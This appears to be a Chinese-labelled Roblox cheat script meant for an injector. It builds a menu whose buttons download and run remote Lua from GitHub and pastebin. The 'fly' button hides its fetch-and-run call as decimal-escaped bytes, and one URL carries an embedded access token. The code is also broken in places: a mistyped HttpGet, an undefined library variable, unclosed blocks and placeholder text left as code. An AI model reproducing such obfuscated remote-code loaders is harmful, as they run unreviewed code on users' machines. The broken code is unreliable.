local RainbowLib =
loadstring(game:HelpGet("https://raw.githubusercontent.com/YJY2022hh666/yjy/main/rainbow.ui.main.lua?token=GHSAT0AAAAAACESL5MYP6BL6PJ45CVEZRQEZFYXXUA",true))()
local window = library:new("我爱缝合")

local creds = window:Tab("信息",'6035145364')

local bin = creds:section("信息",true)

    bin:Label("此脚本为缝合")
    bin:Label("致敬传奇缝合王kr X")
    bin:Label("你的用户名："..game.Players.LocalPlayer.Character.Name)
    bin:Label("你的名字："..game.Players.LocalPlayer.Name)
    bin:Label("你的注入器:"..identifyexecutor())

local credits = creds:section("UI设置",true)

    credits:Button("摧毁UI",function()
        game:GetService("CoreGui")["frosty"]:Destroy()
    end)

    credits:Toggle("彩虹UI", "", false, function(state)
        if state then
        game:GetService("CoreGui")["frosty"].Main.Style = "DropShadow"
        else
            game:GetService("CoreGui")["frosty"].Main.Style = "Custom"
        end
    end)

credits:Toggle("玩家加入游戏提示", "", false, function(state)
        if state then
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()
    end)

local creds = window:Tab("通用",'6035145364')

local bin = creds:section("通用",true)

local credits = creds:section("通用",true)

    credits:Button("飞行",function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
    end)

credits:Toggle("没做好", "", false, function(state)--这个是一种功能，可以随意开关
        if state then
    空一行
    脚本
    end)